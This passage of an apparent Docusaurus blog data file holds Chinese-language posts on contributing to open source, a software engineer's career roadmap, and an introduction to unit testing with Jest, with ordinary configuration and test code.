1: \u6587\u6863\u548c typo\\nLevel 2: \u5c0f bug \u4fee\u590d\\nLevel 3: \u65b0\u529f\u80fd\\nLevel 4: \u6838\u5fc3\u529f\u80fd\\nLevel 5: \u6210\u4e3a\u7ef4\u62a4\u8005\\n```\\n\\n---\\n\\n## \ud83c\udf1f \u63a8\u8350\u9879\u76ee\\n\\n### \u65b0\u624b\u53cb\u597d\\n\\n| \u9879\u76ee | \u7c7b\u578b | \u8bed\u8a00 |\\n|------|------|------|\\n| first-contributions | \u7ec3\u4e60 | \u591a\u8bed\u8a00 |\\n| freeCodeCamp | \u6559\u80b2 | JavaScript |\\n| EddieHub | \u793e\u533a | \u591a\u8bed\u8a00 |\\n\\n### \u524d\u7aef\\n\\n| \u9879\u76ee | \u8bf4\u660e |\\n|------|------|\\n| React | \u524d\u7aef\u6846\u67b6 |\\n| Vue | \u524d\u7aef\u6846\u67b6 |\\n| TypeScript | \u7c7b\u578b\u7cfb\u7edf |\\n| Docusaurus | \u6587\u6863\u6846\u67b6 |\\n\\n### \u5de5\u5177\\n\\n| \u9879\u76ee | \u8bf4\u660e |\\n|------|------|\\n| VS Code | \u7f16\u8f91\u5668 |\\n| ESLint | \u4ee3\u7801\u68c0\u67e5 |\\n| Prettier | \u4ee3\u7801\u683c\u5f0f\u5316 |\\n\\n---\\n\\n## \ud83d\udee0\ufe0f \u5b9e\u7528\u5de5\u5177\\n\\n### GitHub CLI\\n\\n```bash\\n# \u5b89\u88c5\\nbrew install gh\\n\\n# \u514b\u9686\u5e76\u521b\u5efa PR\\ngh repo clone owner/repo\\ngh pr create\\n\\n# \u67e5\u770b Issue\\ngh issue list\\ngh issue view 123\\n```\\n\\n### \u672c\u5730\u5f00\u53d1\\n\\n```markdown\\n- \u4f7f\u7528 GitHub Desktop \u7b80\u5316 Git \u64cd\u4f5c\\n- \u914d\u7f6e SSH key \u65b9\u4fbf\u63a8\u9001\\n- \u4f7f\u7528 .nvmrc \u7ba1\u7406 Node \u7248\u672c\\n```\\n\\n---\\n\\n## \ud83d\udcc8 \u6301\u7eed\u6210\u957f\\n\\n### \u5efa\u7acb\u5f71\u54cd\u529b\\n\\n```markdown\\n1. \u6301\u7eed\u8d21\u732e\uff0c\u79ef\u7d2f\u4fe1\u8a89\\n2. \u53c2\u4e0e\u8ba8\u8bba\uff0c\u63d0\u4f9b\u4ef7\u503c\\n3. \u5199\u535a\u5ba2\u5206\u4eab\u7ecf\u9a8c\\n4. \u5728\u793e\u533a\u4fdd\u6301\u6d3b\u8dc3\\n```\\n\\n### \u521b\u5efa\u81ea\u5df1\u7684\u9879\u76ee\\n\\n```markdown\\n\u5f53\u4f60\u6709\u4e86\u7ecf\u9a8c\uff1a\\n1. \u5f00\u6e90\u81ea\u5df1\u7684\u5de5\u5177/\u5e93\\n2. \u5199\u597d\u6587\u6863\\n3. \u7ef4\u62a4\u597d\u9879\u76ee\\n4. \u5438\u5f15\u8d21\u732e\u8005\\n```\\n\\n---\\n\\n## \ud83d\udcda \u63a8\u8350\u8d44\u6e90\\n\\n- [GitHub \u5f00\u6e90\u6307\u5357](https://opensource.guide/zh-hans/)\\n- [First Contributions](https://github.com/firstcontributions/first-contributions)\\n- [Good First Issue](https://goodfirstissue.dev/)\\n- [Up For Grabs](https://up-for-grabs.net/)\\n\\n---\\n\\n\u5f00\u6e90\u4e0d\u53ea\u662f\u4ee3\u7801\uff0c\u66f4\u662f\u4e00\u79cd\u7cbe\u795e\u3002\u4ece\u4eca\u5929\u5f00\u59cb\uff0c\u8fc8\u51fa\u4f60\u7684\u7b2c\u4e00\u6b65\uff01"},{"id":"tech-career-growth","metadata":{"permalink":"/blog/tech-career-growth","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-06-20-career-growth.md","source":"@site/blog/2024-06-20-career-growth.md","title":"\u6280\u672f\u6210\u957f\u8def\u7ebf\u56fe","description":"\u6280\u672f\u6210\u957f\u4e0d\u53ea\u662f\u5b66\u4e60\u65b0\u6280\u672f\uff0c\u66f4\u662f\u5efa\u7acb\u5b8c\u6574\u7684\u77e5\u8bc6\u4f53\u7cfb\u548c\u601d\u7ef4\u65b9\u5f0f\u3002\u672c\u6587\u5206\u4eab\u6211\u7684\u5b66\u4e60\u65b9\u6cd5\u548c\u6210\u957f\u5fc3\u5f97\u3002","date":"2024-06-20T00:00:00.000Z","tags":[{"inline":true,"label":"\u6210\u957f","permalink":"/blog/tags/\u6210\u957f"},{"inline":true,"label":"\u804c\u4e1a\u53d1\u5c55","permalink":"/blog/tags/\u804c\u4e1a\u53d1\u5c55"},{"inline":true,"label":"\u5b66\u4e60","permalink":"/blog/tags/\u5b66\u4e60"}],"readingTime":3.44,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"tech-career-growth","title":"\u6280\u672f\u6210\u957f\u8def\u7ebf\u56fe","authors":"mason","tags":["\u6210\u957f","\u804c\u4e1a\u53d1\u5c55","\u5b66\u4e60"]},"unlisted":false,"prevItem":{"title":"\u5f00\u6e90\u9879\u76ee\u8d21\u732e\u6307\u5357","permalink":"/blog/open-source-contribution"},"nextItem":{"title":"\u5355\u5143\u6d4b\u8bd5\u5165\u95e8\u6307\u5357","permalink":"/blog/unit-testing-guide"}},"content":"\u6280\u672f\u6210\u957f\u4e0d\u53ea\u662f\u5b66\u4e60\u65b0\u6280\u672f\uff0c\u66f4\u662f\u5efa\u7acb\u5b8c\u6574\u7684\u77e5\u8bc6\u4f53\u7cfb\u548c\u601d\u7ef4\u65b9\u5f0f\u3002\u672c\u6587\u5206\u4eab\u6211\u7684\u5b66\u4e60\u65b9\u6cd5\u548c\u6210\u957f\u5fc3\u5f97\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u6210\u957f\u9636\u6bb5\\n\\n### \u521d\u7ea7\u5de5\u7a0b\u5e08 (0-2 \u5e74)\\n\\n**\u76ee\u6807**\uff1a\u80fd\u72ec\u7acb\u5b8c\u6210\u529f\u80fd\u5f00\u53d1\\n\\n```markdown\\n\u6838\u5fc3\u80fd\u529b\uff1a\\n- \u719f\u7ec3\u4f7f\u7528\u4e00\u95e8\u8bed\u8a00\\n- \u719f\u6089\u4e3b\u6d41\u6846\u67b6\\n- \u80fd\u72ec\u7acb\u8c03\u8bd5\u95ee\u9898\\n- \u57fa\u672c\u7684\u4ee3\u7801\u89c4\u8303\\n\\n\u5b66\u4e60\u91cd\u70b9\uff1a\\n- \u6253\u597d\u57fa\u7840\uff08\u6570\u636e\u7ed3\u6784\u3001\u7b97\u6cd5\uff09\\n- \u6df1\u5165\u7406\u89e3\u6846\u67b6\u539f\u7406\\n- \u591a\u5199\u4ee3\u7801\uff0c\u591a\u8e29\u5751\\n- \u5b66\u4f1a\u8bfb\u6587\u6863\u548c\u6e90\u7801\\n```\\n\\n### \u4e2d\u7ea7\u5de5\u7a0b\u5e08 (2-5 \u5e74)\\n\\n**\u76ee\u6807**\uff1a\u80fd\u8d1f\u8d23\u6a21\u5757\u8bbe\u8ba1\u548c\u6280\u672f\u9009\u578b\\n\\n```markdown\\n\u6838\u5fc3\u80fd\u529b\uff1a\\n- \u7cfb\u7edf\u8bbe\u8ba1\u80fd\u529b\\n- \u6027\u80fd\u4f18\u5316\u7ecf\u9a8c\\n- \u4ee3\u7801\u8bc4\u5ba1\u80fd\u529b\\n- \u6280\u672f\u65b9\u6848\u8c03\u7814\\n\\n\u5b66\u4e60\u91cd\u70b9\uff1a\\n- \u5b66\u4e60\u8bbe\u8ba1\u6a21\u5f0f\\n- \u6df1\u5165\u6027\u80fd\u4f18\u5316\\n- \u6269\u5c55\u6280\u672f\u5e7f\u5ea6\\n- \u57f9\u517b\u6c9f\u901a\u80fd\u529b\\n```\\n\\n### \u9ad8\u7ea7\u5de5\u7a0b\u5e08 (5+ \u5e74)\\n\\n**\u76ee\u6807**\uff1a\u80fd\u4e3b\u5bfc\u6280\u672f\u51b3\u7b56\uff0c\u5e26\u9886\u56e2\u961f\\n\\n```markdown\\n\u6838\u5fc3\u80fd\u529b\uff1a\\n- \u67b6\u6784\u8bbe\u8ba1\u80fd\u529b\\n- \u6280\u672f\u96be\u9898\u653b\u5173\\n- \u56e2\u961f\u534f\u4f5c\u9886\u5bfc\\n- \u4e1a\u52a1\u7406\u89e3\u6df1\u5ea6\\n\\n\u5b66\u4e60\u91cd\u70b9\uff1a\\n- \u67b6\u6784\u601d\u7ef4\\n- \u6280\u672f\u7ba1\u7406\\n- \u4e1a\u52a1\u654f\u611f\u5ea6\\n- \u5f71\u54cd\u529b\u5efa\u8bbe\\n```\\n\\n---\\n\\n## \ud83d\udcda \u5b66\u4e60\u65b9\u6cd5\\n\\n### 1. \u8d39\u66fc\u5b66\u4e60\u6cd5\\n\\n```markdown\\n1. \u9009\u62e9\u4e00\u4e2a\u6982\u5ff5\\n2. \u5c1d\u8bd5\u6559\u7ed9\u522b\u4eba\uff08\u5199\u535a\u5ba2/\u5206\u4eab\uff09\\n3. \u53d1\u73b0\u81ea\u5df1\u7684\u77e5\u8bc6\u6f0f\u6d1e\\n4. \u56de\u53bb\u5b66\u4e60\uff0c\u7b80\u5316\u8868\u8fbe\\n5. \u91cd\u590d\uff0c\u76f4\u5230\u80fd\u7b80\u5355\u89e3\u91ca\\n```\\n\\n### 2. \u523b\u610f\u7ec3\u4e60\\n\\n```markdown\\n- \u8d70\u51fa\u8212\u9002\u533a\\n- \u8bbe\u5b9a\u5177\u4f53\u76ee\u6807\\n- \u4e13\u6ce8\u7ec3\u4e60\\n- \u83b7\u5f97\u53cd\u9988\\n- \u6301\u7eed\u6539\u8fdb\\n```\\n\\n### 3. \u8f93\u51fa\u9a71\u52a8\\n\\n```markdown\\n\u2705 \u6709\u6548\u7684\u5b66\u4e60\u65b9\u5f0f\uff1a\\n- \u5199\u6280\u672f\u535a\u5ba2\\n- \u505a\u6280\u672f\u5206\u4eab\\n- \u53c2\u4e0e\u5f00\u6e90\\n- \u56de\u7b54\u95ee\u9898\\n\\n\u274c \u4f4e\u6548\u7684\u5b66\u4e60\u65b9\u5f0f\uff1a\\n- \u53ea\u770b\u4e0d\u7ec3\\n- \u6536\u85cf\u4e0d\u8bfb\\n- \u6d45\u5c1d\u8f84\u6b62\\n```\\n\\n---\\n\\n## \ud83d\udee4\ufe0f \u5b66\u4e60\u8def\u5f84\\n\\n### \u524d\u7aef\u5de5\u7a0b\u5e08\\n\\n```markdown\\n\u9636\u6bb51\uff1a\u57fa\u7840\\n- HTML/CSS/JavaScript\\n- \u6d4f\u89c8\u5668\u539f\u7406\\n- HTTP \u534f\u8bae\\n\\n\u9636\u6bb52\uff1a\u6846\u67b6\\n- React/Vue\\n- \u72b6\u6001\u7ba1\u7406\\n- \u8def\u7531\\n\\n\u9636\u6bb53\uff1a\u5de5\u7a0b\u5316\\n- Webpack/Vite\\n- TypeScript\\n- \u6d4b\u8bd5\\n\\n\u9636\u6bb54\uff1a\u8fdb\u9636\\n- \u6027\u80fd\u4f18\u5316\\n- \u5fae\u524d\u7aef\\n- Node.js\\n- \u8de8\u7aef\u5f00\u53d1\\n```\\n\\n### \u540e\u7aef\u5de5\u7a0b\u5e08\\n\\n```markdown\\n\u9636\u6bb51\uff1a\u8bed\u8a00\u57fa\u7840\\n- \u4e00\u95e8\u540e\u7aef\u8bed\u8a00\uff08Node/Go/Java\uff09\\n- \u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\\n\\n\u9636\u6bb52\uff1aWeb \u5f00\u53d1\\n- HTTP/REST\\n- \u6570\u636e\u5e93\uff08SQL/NoSQL\uff09\\n- \u7f13\u5b58\uff08Redis\uff09\\n\\n\u9636\u6bb53\uff1a\u7cfb\u7edf\u8bbe\u8ba1\\n- \u5206\u5e03\u5f0f\u7cfb\u7edf\\n- \u6d88\u606f\u961f\u5217\\n- \u5fae\u670d\u52a1\\n\\n\u9636\u6bb54\uff1a\u8fdb\u9636\\n- \u9ad8\u5e76\u53d1\\n- \u9ad8\u53ef\u7528\\n- \u4e91\u539f\u751f\\n```\\n\\n---\\n\\n## \ud83d\udca1 \u6210\u957f\u5efa\u8bae\\n\\n### 1. \u5efa\u7acb\u77e5\u8bc6\u4f53\u7cfb\\n\\n```markdown\\n\u4e0d\u8981\u5b64\u7acb\u5730\u5b66\u4e60\u6280\u672f\u70b9\uff0c\u800c\u662f\uff1a\\n- \u7406\u89e3\u6280\u672f\u4e4b\u95f4\u7684\u5173\u7cfb\\n- \u77e5\u9053\u6bcf\u4e2a\u6280\u672f\u89e3\u51b3\u4ec0\u4e48\u95ee\u9898\\n- \u80fd\u753b\u51fa\u6280\u672f\u5168\u666f\u56fe\\n```\\n\\n### 2. \u6df1\u5ea6\u4f18\u5148\\n\\n```markdown\\n\u4e0e\u5176\u6d45\u5c1d10\u4e2a\u6846\u67b6\uff0c\u4e0d\u5982\uff1a\\n- \u6df1\u5165\u638c\u63e11-2\u4e2a\\n- \u7406\u89e3\u5e95\u5c42\u539f\u7406\\n- \u80fd\u591f\u4e3e\u4e00\u53cd\u4e09\\n```\\n\\n### 3. \u6301\u7eed\u79ef\u7d2f\\n\\n```markdown\\n\u6bcf\u5929\u8fdb\u6b65\u4e00\u70b9\u70b9\uff1a\\n- \u6bcf\u5929\u8bfb\u4e00\u7bc7\u6280\u672f\u6587\u7ae0\\n- \u6bcf\u5468\u5199\u4e00\u7bc7\u7b14\u8bb0\\n- \u6bcf\u6708\u505a\u4e00\u6b21\u5206\u4eab\\n- \u6bcf\u5e74\u5b8c\u6210\u4e00\u4e2a\u9879\u76ee\\n```\\n\\n### 4. \u57f9\u517b\u8f6f\u6280\u80fd\\n\\n```markdown\\n\u6280\u672f\u4e0d\u662f\u5168\u90e8\uff1a\\n- \u6c9f\u901a\u8868\u8fbe\u80fd\u529b\\n- \u9879\u76ee\u7ba1\u7406\u80fd\u529b\\n- \u4e1a\u52a1\u7406\u89e3\u80fd\u529b\\n- \u56e2\u961f\u534f\u4f5c\u80fd\u529b\\n```\\n\\n---\\n\\n## \ud83d\udcd6 \u63a8\u8350\u8d44\u6e90\\n\\n### \u4e66\u7c4d\\n\\n| \u7c7b\u522b | \u63a8\u8350\u4e66\u7c4d |\\n|------|---------|\\n| \u57fa\u7840 | \u300a\u7b97\u6cd5\u5bfc\u8bba\u300b\u300a\u8ba1\u7b97\u673a\u7f51\u7edc\u300b |\\n| JavaScript | \u300aJavaScript \u9ad8\u7ea7\u7a0b\u5e8f\u8bbe\u8ba1\u300b\u300aYou Don\'t Know JS\u300b |\\n| \u67b6\u6784 | \u300a\u8bbe\u8ba1\u6a21\u5f0f\u300b\u300a\u7cfb\u7edf\u8bbe\u8ba1\u300b |\\n| \u8f6f\u6280\u80fd | \u300a\u7a0b\u5e8f\u5458\u4fee\u70bc\u4e4b\u9053\u300b\u300a\u4ee3\u7801\u6574\u6d01\u4e4b\u9053\u300b |\\n\\n### \u7f51\u7ad9\\n\\n| \u7c7b\u578b | \u63a8\u8350 |\\n|------|------|\\n| \u5b66\u4e60 | MDN\u3001web.dev\u3001React \u5b98\u7f51 |\\n| \u7ec3\u4e60 | LeetCode\u3001CodeWars |\\n| \u9605\u8bfb | Medium\u3001Dev.to\u3001\u6398\u91d1 |\\n| \u89c6\u9891 | YouTube\u3001B\u7ad9 |\\n\\n### \u793e\u533a\\n\\n```markdown\\n- GitHub - \u53c2\u4e0e\u5f00\u6e90\\n- Stack Overflow - \u89e3\u51b3\u95ee\u9898\\n- \u6280\u672f\u8bba\u575b - \u4ea4\u6d41\u8ba8\u8bba\\n- \u672c\u5730 Meetup - \u7ebf\u4e0b\u4ea4\u6d41\\n```\\n\\n---\\n\\n## \u23f0 \u65f6\u95f4\u7ba1\u7406\\n\\n### \u5b66\u4e60\u65f6\u95f4\u5b89\u6392\\n\\n```markdown\\n\u5de5\u4f5c\u65e5\uff1a\\n- \u65e9\u8d77 30 \u5206\u949f\u9605\u8bfb\\n- \u5348\u4f11 20 \u5206\u949f\u5237\u9898\\n- \u665a\u4e0a 1 \u5c0f\u65f6\u5b66\u4e60/\u9879\u76ee\\n\\n\u5468\u672b\uff1a\\n- \u534a\u5929\u6df1\u5ea6\u5b66\u4e60\\n- \u534a\u5929\u9879\u76ee\u5b9e\u8df5\\n- \u9002\u5f53\u4f11\u606f\\n```\\n\\n### \u788e\u7247\u65f6\u95f4\u5229\u7528\\n\\n```markdown\\n- \u901a\u52e4\u542c\u64ad\u5ba2/\u6280\u672f\u89c6\u9891\\n- \u6392\u961f\u770b\u6280\u672f\u6587\u7ae0\\n- \u7b49\u5f85\u65f6\u601d\u8003\u95ee\u9898\\n```\\n\\n---\\n\\n## \ud83c\udfae \u907f\u514d\u7684\u5751\\n\\n### 1. \u8ffd\u65b0\u4e0d\u6b62\\n\\n```markdown\\n\u274c \u6bcf\u4e2a\u65b0\u6846\u67b6\u90fd\u8981\u5b66\\n\u2705 \u8bc4\u4f30\u4ef7\u503c\u518d\u51b3\u5b9a\\n```\\n\\n### 2. \u53ea\u5b66\u4e0d\u7528\\n\\n```markdown\\n\u274c \u5b66\u4e86\u5f88\u591a\uff0c\u9879\u76ee\u6ca1\u505a\\n\u2705 \u5b66\u4ee5\u81f4\u7528\uff0c\u505a\u9879\u76ee\u5b9e\u8df5\\n```\\n\\n### 3. \u95ed\u95e8\u9020\u8f66\\n\\n```markdown\\n\u274c \u81ea\u5df1\u9ed8\u9ed8\u5b66\u4e60\\n\u2705 \u53c2\u4e0e\u793e\u533a\uff0c\u4ea4\u6d41\u5206\u4eab\\n```\\n\\n### 4. \u6025\u4e8e\u6c42\u6210\\n\\n```markdown\\n\u274c \u60f3\u5feb\u901f\u6210\u4e3a\u4e13\u5bb6\\n\u2705 \u63a5\u53d7\u79ef\u7d2f\u9700\u8981\u65f6\u95f4\\n```\\n\\n---\\n\\n## \ud83d\udcdd \u603b\u7ed3\\n\\n```markdown\\n\u6210\u957f\u7684\u5173\u952e\uff1a\\n1. \u6301\u7eed\u5b66\u4e60 - \u4fdd\u6301\u597d\u5947\u5fc3\\n2. \u523b\u610f\u7ec3\u4e60 - \u8d70\u51fa\u8212\u9002\u533a\\n3. \u8f93\u51fa\u5206\u4eab - \u6559\u662f\u6700\u597d\u7684\u5b66\\n4. \u590d\u76d8\u53cd\u601d - \u5b9a\u671f\u603b\u7ed3\u63d0\u5347\\n```\\n\\n---\\n\\n\u6280\u672f\u4e4b\u8def\u6ca1\u6709\u6377\u5f84\uff0c\u4f46\u6b63\u786e\u7684\u65b9\u6cd5\u53ef\u4ee5\u8ba9\u4f60\u8d70\u5f97\u66f4\u5feb\u66f4\u8fdc\u3002\u4fdd\u6301\u70ed\u7231\uff0c\u4eab\u53d7\u8fc7\u7a0b\u3002"},{"id":"unit-testing-guide","metadata":{"permalink":"/blog/unit-testing-guide","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-06-10-unit-testing.md","source":"@site/blog/2024-06-10-unit-testing.md","title":"\u5355\u5143\u6d4b\u8bd5\u5165\u95e8\u6307\u5357","description":"\u5355\u5143\u6d4b\u8bd5\u662f\u4fdd\u8bc1\u4ee3\u7801\u8d28\u91cf\u7684\u91cd\u8981\u624b\u6bb5\u3002\u672c\u6587\u4ecb\u7ecd Jest \u7684\u4f7f\u7528\u65b9\u6cd5\u548c\u6d4b\u8bd5\u6700\u4f73\u5b9e\u8df5\u3002","date":"2024-06-10T00:00:00.000Z","tags":[{"inline":true,"label":"\u6d4b\u8bd5","permalink":"/blog/tags/\u6d4b\u8bd5"},{"inline":true,"label":"Jest","permalink":"/blog/tags/jest"},{"inline":true,"label":"\u4ee3\u7801\u8d28\u91cf","permalink":"/blog/tags/\u4ee3\u7801\u8d28\u91cf"}],"readingTime":3.96,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"unit-testing-guide","title":"\u5355\u5143\u6d4b\u8bd5\u5165\u95e8\u6307\u5357","authors":"mason","tags":["\u6d4b\u8bd5","Jest","\u4ee3\u7801\u8d28\u91cf"]},"unlisted":false,"prevItem":{"title":"\u6280\u672f\u6210\u957f\u8def\u7ebf\u56fe","permalink":"/blog/tech-career-growth"},"nextItem":{"title":"AI \u7f16\u7a0b\u52a9\u624b\u4f7f\u7528\u6280\u5de7","permalink":"/blog/ai-coding-assistant"}},"content":"\u5355\u5143\u6d4b\u8bd5\u662f\u4fdd\u8bc1\u4ee3\u7801\u8d28\u91cf\u7684\u91cd\u8981\u624b\u6bb5\u3002\u672c\u6587\u4ecb\u7ecd Jest \u7684\u4f7f\u7528\u65b9\u6cd5\u548c\u6d4b\u8bd5\u6700\u4f73\u5b9e\u8df5\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u4e3a\u4ec0\u4e48\u9700\u8981\u5355\u5143\u6d4b\u8bd5\\n\\n| \u6536\u76ca | \u8bf4\u660e |\\n|------|------|\\n| \u4fdd\u8bc1\u6b63\u786e\u6027 | \u9a8c\u8bc1\u4ee3\u7801\u6309\u9884\u671f\u5de5\u4f5c |\\n| \u9632\u6b62\u56de\u5f52 | \u4fee\u6539\u4ee3\u7801\u65f6\u53d1\u73b0\u7834\u574f |\\n| \u6587\u6863\u4f5c\u7528 | \u6d4b\u8bd5\u5373\u6587\u6863 |\\n| \u6539\u8fdb\u8bbe\u8ba1 | \u53ef\u6d4b\u8bd5\u7684\u4ee3\u7801\u901a\u5e38\u8bbe\u8ba1\u66f4\u597d |\\n| \u91cd\u6784\u4fe1\u5fc3 | \u6709\u6d4b\u8bd5\u4fdd\u62a4\uff0c\u5927\u80c6\u91cd\u6784 |\\n\\n---\\n\\n## \ud83d\ude80 Jest \u5feb\u901f\u5f00\u59cb\\n\\n### \u5b89\u88c5\\n\\n```bash\\nnpm install -D jest @types/jest ts-jest\\n```\\n\\n### \u914d\u7f6e\\n\\n```javascript\\n// jest.config.js\\nmodule.exports = {\\n  preset: \'ts-jest\',\\n  testEnvironment: \'node\',\\n  testMatch: [\'**/*.test.ts\'],\\n  collectCoverage: true,\\n  coverageThreshold: {\\n    global: {\\n      branches: 80,\\n      functions: 80,\\n      lines: 80,\\n    },\\n  },\\n};\\n```\\n\\n### \u7b2c\u4e00\u4e2a\u6d4b\u8bd5\\n\\n```javascript\\n// sum.ts\\nexport function sum(a: number, b: number): number {\\n  return a + b;\\n}\\n\\n// sum.test.ts\\nimport { sum } from \'./sum\';\\n\\ndescribe(\'sum\', () => {\\n  it(\'should add two numbers\', () => {\\n    expect(sum(1, 2)).toBe(3);\\n  });\\n\\n  it(\'should handle negative numbers\', () => {\\n    expect(sum(-1, 1)).toBe(0);\\n  });\\n});\\n```\\n\\n### \u8fd0\u884c\u6d4b\u8bd5\\n\\n```bash\\nnpx jest\\nnpx jest --watch        # \u76d1\u542c\u6a21\u5f0f\\nnpx jest --coverage     # \u8986\u76d6\u7387\u62a5\u544a\\n```\\n\\n---\\n\\n## \ud83d\udcdd \u5e38\u7528\u65ad\u8a00\\n\\n### \u57fa\u7840\u65ad\u8a00\\n\\n```javascript\\n// \u76f8\u7b49\\nexpect(value).toBe(3);           // \u4e25\u683c\u76f8\u7b49 ===\\nexpect(obj).toEqual({ a: 1 });   // \u6df1\u5ea6\u76f8\u7b49\\n\\n// \u771f\u5047\\nexpect(value).toBeTruthy();\\nexpect(value).toBeFalsy();\\nexpect(value).toBeNull();\\nexpect(value).toBeUndefined();\\nexpect(value).toBeDefined();\\n\\n// \u6570\u5b57\\nexpect(value).toBeGreaterThan(3);\\nexpect(value).toBeLessThan(5);\\nexpect(value).toBeCloseTo(0.3);  // \u6d6e\u70b9\u6570\\n```\\n\\n### \u5b57\u7b26\u4e32\\n\\n```javascript\\nexpect(str).toMatch(/regex/);\\nexpect(str).toContain(\'hello\');\\nexpect(str).toHaveLength(5);\\n```\\n\\n### \u6570\u7ec4\\n\\n```javascript\\nexpect(arr).toContain(\'item\');\\nexpect(arr).toHaveLength(3);\\nexpect(arr).toEqual(expect.arrayContaining([1, 2]));\\n```\\n\\n### \u5bf9\u8c61\\n\\n```javascript\\nexpect(obj).toHaveProperty(\'key\');\\nexpect(obj).toHaveProperty(\'key\', \'value\');\\nexpect(obj).toMatchObject({ a: 1 });\\n```\\n\\n### \u5f02\u5e38\\n\\n```javascript\\nexpect(() => {\\n  throw new Error(\'error\');\\n}).toThrow();\\n\\nexpect(() => {\\n  throw new Error(\'specific error\');\\n}).toThrow(\'specific error\');\\n```\\n\\n---\\n\\n## \ud83d\udd04 \u5f02\u6b65\u6d4b\u8bd5\\n\\n### Promise\\n\\n```javascript\\n// \u8fd4\u56de Promise\\nit(\'fetches data\', () => {\\n  return fetchData().then(data => {\\n    expect(data).toBe(\'data\');\\n  });\\n});\\n\\n// async/await\\nit(\'fetches data\', async () => {\\n  const data = await fetchData();\\n  expect(data).toBe(\'data\');\\n});\\n```\\n\\n### \u56de\u8c03\\n\\n```javascript\\nit(\'calls callback\', done => {\\n  fetchData(data => {\\n    expect(data).toBe(\'data\');\\n    done();\\n  });\\n});\\n```\\n\\n### \u5b9a\u65f6\u5668\\n\\n```javascript\\njest.useFakeTimers();\\n\\nit(\'waits 1 second\', () => {\\n  const callback = jest.fn();\\n  \\n  setTimeout(callback, 1000);\\n  \\n  expect(callback).not.toBeCalled();\\n  \\n  jest.advanceTimersByTime(1000);\\n  \\n  expect(callback).toBeCalled();\\n});\\n```\\n\\n---\\n\\n## \ud83c\udfad Mock \u6280\u672f\\n\\n### Mock \u51fd\u6570\\n\\n```javascript\\nconst mockFn = jest.fn();\\n\\nmockFn(\'arg1\', \'arg2\');\\n\\nexpect(mockFn).toHaveBeenCalled();\\nexpect(mockFn).toHaveBeenCalledWith(\'arg1\', \'arg2\');\\nexpect(mockFn).toHaveBeenCalledTimes(1);\\n```\\n\\n### Mock \u8fd4\u56de\u503c\\n\\n```javascript\\nconst mockFn = jest.fn()\\n  .mockReturnValue(\'default\')\\n  .mockReturnValueOnce(\'first\')\\n  .mockReturnValueOnce(\'second\');\\n\\nmockFn(); // \'first\'\\nmockFn(); // \'second\'\\nmockFn(); // \'default\'\\n```\\n\\n### Mock \u6a21\u5757\\n\\n```javascript\\n// \u81ea\u52a8 Mock\\njest.mock(\'./api\');\\n\\n// \u624b\u52a8 Mock\\njest.mock(\'./api\', () => ({\\n  fetchUser: jest.fn().mockResolvedValue({ name: \'John\' }),\\n}));\\n\\n// \u90e8\u5206 Mock\\njest.mock(\'./utils\', () => ({\\n  ...jest.requireActual(\'./utils\'),\\n  formatDate: jest.fn(),\\n}));\\n```\\n\\n### Mock \u5b9e\u73b0\\n\\n```javascript\\nconst mockFn = jest.fn().mockImplementation((a, b) => a + b);\\n\\n// \u6216\\nconst mockFn = jest.fn((a, b) => a + b);\\n```\\n\\n---\\n\\n## \ud83e\uddea \u6d4b\u8bd5\u7ec4\u7ec7\\n\\n### describe \u5206\u7ec4\\n\\n```javascript\\ndescribe(\'User\', () => {\\n  describe(\'create\', () => {\\n    it(\'creates user with valid data\', () => {});\\n    it(\'throws error with invalid email\', () => {});\\n  });\\n\\n  describe(\'update\', () => {\\n    it(\'updates user name\', () => {});\\n    it(\'updates user email\', () => {});\\n  });\\n});\\n```\\n\\n### \u751f\u547d\u5468\u671f\\n\\n```javascript\\ndescribe(\'Database\', () => {\\n  beforeAll(async () => {\\n    // \u6240\u6709\u6d4b\u8bd5\u524d\u6267\u884c\u4e00\u6b21\\n    await db.connect();\\n  });\\n\\n  afterAll(async () => {\\n    // \u6240\u6709\u6d4b\u8bd5\u540e\u6267\u884c\u4e00\u6b21\\n    await db.disconnect();\\n  });\\n\\n  beforeEach(() => {\\n    // \u6bcf\u4e2a\u6d4b\u8bd5\u524d\u6267\u884c\\n    jest.clearAllMocks();\\n  });\\n\\n  afterEach(async () => {\\n    // \u6bcf\u4e2a\u6d4b\u8bd5\u540e\u6267\u884c\\n    await db.cleanup();\\n  });\\n});\\n```\\n\\n---\\n\\n## \ud83d\udcca \u8986\u76d6\u7387\\n\\n### \u6307\u6807\u8bf4\u660e\\n\\n| \u6307\u6807 | \u8bf4\u660e |\\n|------|------|\\n| Statements | \u8bed\u53e5\u8986\u76d6\u7387 |\\n| Branches | \u5206\u652f\u8986\u76d6\u7387 (if/else) |\\n| Functions | \u51fd\u6570\u8986\u76d6\u7387 |\\n| Lines | \u884c\u8986\u76d6\u7387 |\\n\\n### \u67e5\u770b\u62a5\u544a\\n\\n```bash\\nnpx jest --coverage\\n\\n# \u751f\u6210 HTML \u62a5\u544a\\n# \u6253\u5f00 coverage/lcov-report/index.html\\n```\\n\\n---\\n\\n## \u2705 \u6700\u4f73\u5b9e\u8df5\\n\\n### 1. \u6d4b\u8bd5\u547d\u540d\\n\\n```javascript\\n// \u2705 \u597d\u7684\u547d\u540d\\nit(\'should return user when id is valid\', () => {});\\nit(\'should throw error when email is invalid\', () => {});\\n\\n// \u274c \u4e0d\u597d\u7684\u547d\u540d\\nit(\'test 1\', () => {});\\nit(\'works\', () => {});\\n```\\n\\n### 2. AAA \u6a21\u5f0f\\n\\n```javascript\\nit(\'calculates total price\', () => {\\n  // Arrange - \u51c6\u5907\\n  const items = [{ price: 10 }, { price: 20 }];\\n  \\n  // Act - \u6267\u884c\\n  const total = calculateTotal(items);\\n  \\n  // Assert - \u65ad\u8a00\\n  